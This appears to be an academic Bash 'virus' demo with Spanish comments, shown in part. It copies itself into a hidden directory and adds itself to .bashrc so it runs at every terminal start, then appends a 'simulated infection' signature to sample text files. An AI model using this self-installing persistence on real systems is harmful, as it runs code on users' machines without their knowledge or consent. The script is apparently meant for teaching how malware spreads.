!/bin/bash
#   1) Infección de Archivos de Demostración:
#      Busca archivos .txt en un directorio demo y les agrega una firma si no están ya "infectados".
# --- Persistencia ---
# Crear directorio oculto para el virus
mkdir -p "$VIRUS_DIR"

# Copiarse a sí mismo en el directorio oculto (si aún no está allí)
if [ "$(realpath "$0")" != "$(realpath "$VIRUS_SCRIPT")" ]; then
    cp "$0" "$VIRUS_SCRIPT"
fi

# Añadir al .bashrc para ejecutar el script en cada inicio de terminal
if ! grep -q "$VIRUS_SCRIPT" "$BASHRC"; then
    echo "bash $VIRUS_SCRIPT &" >> "$BASHRC"
fi
# --- Funcionalidad 1: Infección de Archivos de Demostración ---
# Crear directorio de demostración y generar archivos de ejemplo si no existen
mkdir -p "$DEMO_DIR"
for i in {1..3}; do
    file="$DEMO_DIR/demo_$i.txt"
    if [ ! -f "$file" ]; then
        echo "Contenido original del archivo $i." > "$file"
    fi
done

# Función que "infecta" los archivos agregando una firma
infect_files() {
    echo "Iniciando infección de archivos en $DEMO_DIR..."
    for file in "$DEMO_DIR"/*.txt; do
        if grep -q "### Infección Simulada" "$file"; then
            echo "El archivo $(basename "$file") ya está infectado por JoseA."
        else
            echo "" >> "$file"
            echo "### Infección Simulada - Virus Académico ###" >> "$file"
            echo "Archivo infectado: $(basename "$file")"
        fi
    done
    echo "Infección de archivos completada."
}